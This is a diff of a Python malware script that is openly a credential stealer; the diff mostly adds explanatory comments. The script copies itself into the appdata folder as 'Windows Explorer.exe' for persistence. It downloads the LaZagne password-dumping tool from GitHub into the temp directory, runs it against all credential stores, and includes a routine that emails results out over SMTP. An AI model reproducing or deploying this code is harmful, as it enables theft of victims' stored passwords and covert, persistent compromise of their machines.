@@ -5,6 +5,7 @@ import os
 import tempfile
 import shutil
 
+# Adds Download.exe to windows reg editor for persisitenece
 def become_persistent():
     Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
     if not os.path.exists(Malocation):
@@ -31,11 +32,12 @@ def SendMail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
-temp_directory = tempfile.gettempdir()
+temp_directory = tempfile.gettempdir() # Get's temp directory to place lazagne.exe in
 os.chdir(temp_directory)
 
 Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
 
+# Runs lazagne.exe on all search types for credential harvesting
 result = subprocess.check_output("lazagne.exe all", shell=True);
 print(result)
 
